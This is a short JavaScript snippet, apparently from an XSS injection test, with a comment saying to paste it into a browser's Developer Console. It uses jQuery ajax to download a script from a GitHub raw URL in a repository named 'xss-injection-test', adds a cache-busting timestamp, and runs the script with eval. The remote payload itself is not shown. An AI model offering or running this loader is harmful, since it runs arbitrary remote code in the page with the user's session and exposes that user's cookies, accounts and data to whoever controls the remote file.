/**
This file contains the code snippet needed to be coded on the Developer Console
**/

$.ajax({
    url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js?' + new Date().getTime(),
    success: function (data){
        eval(data);
    }
  });
